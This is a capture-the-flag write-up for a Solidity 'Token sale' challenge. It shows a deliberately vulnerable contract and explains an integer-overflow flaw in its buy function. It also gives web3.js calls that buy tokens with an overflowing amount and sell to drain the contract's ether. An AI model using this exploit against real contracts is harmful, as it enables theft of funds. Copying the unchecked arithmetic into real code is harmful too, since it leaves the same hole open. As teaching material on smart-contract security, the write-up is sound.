# 09. Token sale

This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether.

The contract starts off with a balance of 1 ether. See if you can take some of that away.

## Target contract

```solidity
pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}
```

## Vulnerability

There is a reason that SafeMath is recommended for arithmetic operations in solidity... Overflow and underflow can happen when inputs are not bounded to a safe range. As of Solidity 0.8.0 arithmetic operation check for overflow and underflow automatically reverting if any of those happen.

In the target contract : `require(msg.value == numTokens * PRICE_PER_TOKEN);` is the vulnerability. If you were to send a `numTokens` high enough to cause `numTokens * PRICE_PER_TOKEN` to overflow you would loop back to 0 after reaching 2 ** 256.

So, given that `PRICE_PER_TOKEN` = `1000000000000000000` (1 ETH), we can compute the number of tokens require to overflow as : `OVERFLOW =  2 ** 256 // PRICE_PER_TOKEN` which is equal to : `115792089237316195423570985008687907853269984665640564039457`. Due to rounding errors on integer division we will use `OVERFLOW + 1`.

```solidity
PRICE_PER_TOKEN * OVERFLOW
//115792089237316195423570985008687907853269984665640564039457000000000000000000

PRICE_PER_TOKEN * (OVERFLOW + 1)
// 415992086870360064
```

We will call `buy` for `115792089237316195423570985008687907853269984665640564039458` tokens with the required `msg.value` of `415992086870360064` Wei (0.41... ETH).

```js
const contract = "0xD34746a4338c29431a2310B8FA1eA74Fb885fD33";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "buy",
    type: "function",
    inputs: [{ type: "uint256", name: "numTokens" }],
  },
  ["115792089237316195423570985008687907853269984665640564039458"]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: contract,
  data: data,
  value: "415992086870360064",
});
```
Now we need to withdraw 1 ETH, and get out with a net profit of 0.59 ETH :

```js
/* ADD YOUR CODE HERE */
const contract = "0xD34746a4338c29431a2310B8FA1eA74Fb885fD33";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "sell",
    type: "function",
    inputs: [{ type: "uint256", name: "numTokens" }],
  },
  ["1"]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: contract,
  data: data,
});
```

And pass the challenge !